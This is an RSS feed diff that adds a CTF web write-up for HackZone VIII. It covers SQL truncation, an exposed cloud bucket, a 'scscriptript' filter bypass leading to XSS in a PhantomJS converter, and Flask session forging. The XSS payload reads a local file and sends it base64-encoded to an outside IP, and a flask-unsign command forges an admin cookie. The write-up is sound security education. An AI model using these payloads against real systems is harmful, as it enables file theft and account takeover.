@@ -5,12 +5,104 @@
     <link>https://ahmed-belkahla.me/post/</link>
       <atom:link href="https://ahmed-belkahla.me/post/index.xml" rel="self" type="application/rss+xml" />
     <description>Posts</description>
-    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><copyright>© Ahmed Belkahla, 2020</copyright><lastBuildDate>Sat, 04 Apr 2020 00:00:00 +0000</lastBuildDate>
+    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><copyright>© Ahmed Belkahla, 2020</copyright><lastBuildDate>Sun, 12 Apr 2020 00:10:44 +0000</lastBuildDate>
     <image>
       <url>https://ahmed-belkahla.me/img/me.jpg</url>
       <title>Posts</title>
       <link>https://ahmed-belkahla.me/post/</link>
     </image>
+    
+    <item>
+      <title>HackZone VIII - Web Writeups</title>
+      <link>https://ahmed-belkahla.me/post/hackzone-viii/</link>
+      <pubDate>Sun, 12 Apr 2020 00:10:44 +0000</pubDate>
+      <guid>https://ahmed-belkahla.me/post/hackzone-viii/</guid>
+      <description>&lt;p&gt;Hello guys , HackZone VIII CTF has ended this morning , i participated with my team Fword and we got the 4th place, here is my writeup for the three web challenges I managed to solve :D&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/xrafZEo.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;babyweb1722pts10-solves-&#34;&gt;&lt;strong&gt;BabyWeb1(722pts)(10 solves)&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/zu1XKQe.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;In this task we are given a platform where we can share a picture with some msg and it generates a password for us to access these details ,there are already some pictures posted by the author, so we have to access them and maybe the flag in the details of one of them.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/9hXA90t.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Trying to post a picture with the same title of the posted pictures will be denied so let&amp;rsquo;s try SQL truncation attack and submit a picture with these details :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Title : &amp;ldquo;naaah                                                                 &amp;quot;&lt;/li&gt;
+&lt;li&gt;url : &amp;ldquo;anything here&amp;rdquo;
+-msg : &amp;ldquo;anything&amp;rdquo;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;And Bingo it passed the title check and we got a password :D&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/rywyGg4.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Using this password will give us the details of the picture and the flag if we check the source code :D&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/bpK7N8F.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;insecure884pts4-solves-&#34;&gt;&lt;strong&gt;Insecure(884pts)(4 solves)&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/ehpXH1T.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;I really had a lot of fun playing this task ,we are given a text to image converter website , as the description said the first part of the flag is due to a misconfiguration so the first thing i thinked about is a bucket misconfig and it was the case.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/lISjgSe.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Accessing this url will give us the first part (The same bucket where Hackzone Logo is stored)&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://storage.googleapis.com/hzviii/flag_part1.txt&#34;&gt;https://storage.googleapis.com/hzviii/flag_part1.txt&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;1st Part:&lt;/strong&gt; HZVIII{Buck3t_M1sc0nf1gur4t1on_&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s start the second part which is the most interesting , we have to read this file /psycor/flag_part2.txt , so the first thing i thinked about was abusing an SSRF and read local files .
+It was a php website so firstly i thinked that maybe we will use an exploit in the famous GD library of php or something like that but it was only a rabbit hole xd&lt;/p&gt;
+&lt;p&gt;After some enumeration i discovered that we have an XSS here , so things are becoming clearer maybe it&amp;rsquo;s using phantom Js to convert this text .&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/UAn5UOk.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Our scenario now is revealed , we&amp;rsquo;ll exploit this XSS vulnerability to read local files , we have also to mention that the script tag was filtered .
+I passed a lot of time in this part and tried a lot with basically this payload but i didn&amp;rsquo;t get anything :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;img src=&amp;quot;aa&amp;quot; onerror=&amp;quot;function reqListener () {
+    var encoded = encodeURI(this.responseText);
+    var b64 = btoa(this.responseText);
+    var raw = this.responseText;
+    document.write(&#39;&amp;lt;iframe src=&amp;quot;http://100.26.206.184:1234/?a=&#39;+b64+&#39;&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&#39;);
+} 
+var oReq = new XMLHttpRequest(); 
+oReq.addEventListener(&#39;load&#39;, reqListener); 
+oReq.open(&#39;GET&#39;, &#39;file:///psycor/flag_part2.txt&#39;); 
+oReq.send();&amp;quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I have than tried to read it using iframes but i didn&amp;rsquo;t have any results :&#39;(&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/bZInnkb.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This was really painful xd i thinked that maybe using onerror attribute , phantom Js won&amp;rsquo;t wait until XMLHttpRequest fetch the content of the file , so maybe we have to use the script tag ? But it&amp;rsquo;s filtered so all we have to do is bypass this filter :D&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/ySPcXuS.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;As we see in the picture below , the script word is stripped so what if we enter :&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;scscriptript&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The script word will be stripped and Bingo we will have our script tag , let&amp;rsquo;s try it&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/OqHP5I5.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Yeees It workeed :D so now how will we use the script tag ? we will simply try to convert this line now :&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;scscriptript src=&amp;quot;http://100.26.206.184:1234/test.js&amp;quot;&amp;gt;&amp;lt;/scscriptript&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;NOTE :&lt;/strong&gt; It&amp;rsquo;s my VPS IP so DONT use it :D&lt;/p&gt;
+&lt;p&gt;And i hosted the test.js file in my server , this is its content , we will try to read the file using XMLHttpRequest so basically the same payload as below&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function reqListener () {
+    var encoded = encodeURI(this.responseText);
+    var b64 = btoa(this.responseText);
+    var raw = this.responseText;
+    document.write(&#39;&amp;lt;iframe src=&amp;quot;http://100.26.206.184:1234/?a=&#39;+b64+&#39;&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&#39;);
+} 
+var oReq = new XMLHttpRequest(); 
+oReq.addEventListener(&amp;quot;load&amp;quot;, reqListener); 
+oReq.open(&amp;quot;GET&amp;quot;, &amp;quot;file:///psycor/flag_part2.txt&amp;quot;); 
+oReq.send();
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And yees we received an answer :D&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/hTbrKXX.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Base64 decoding it will give us the last part of the flag :D I really enjoyed this task so thank you @PsycoR for your efforts&lt;/p&gt;
+&lt;h1 id=&#34;calculator722pts10-solves-&#34;&gt;&lt;strong&gt;Calculator(722pts)(10 solves)&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;This task was pretty obvious , we have x and y parameters and the web app calculates their division , if we enter any character we will have the error page and Bingo debug mode is true :D&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/iLqircE.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We will now leak the Secret key of the app and sign a session cookie that has the attribute &amp;ldquo;is_admin&amp;rdquo; set to True .&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/jTwwuLm.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;To do that we will use flask-unsign tool with the following command :&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;flask-unsign &amp;ndash;sign &amp;ndash;cookie &amp;ldquo;{&amp;lsquo;is_admin&amp;rsquo;: True}&amp;rdquo; &amp;ndash;secret &amp;lsquo;DeRz7YDZ5nCDqR3vt33QpuhkrSYLmuX8&amp;rsquo; &amp;ndash;legacy&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/NIEbykl.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;And changing the cookie will give us the flag !&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/xOhQh4y.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;I want to thank the organizers for this cool CTF and nice tasks, unfortunately i didn&amp;rsquo;t have enough time to look at pwn tasks :( I really have to sleep now so if you have any questions contact me on Twitter @BelkahlaAhmed1&lt;/p&gt;
+</description>
+    </item>
     
     <item>
       <title>Midnight Sun CTF Quals 2020 - Pwn Writeups</title>
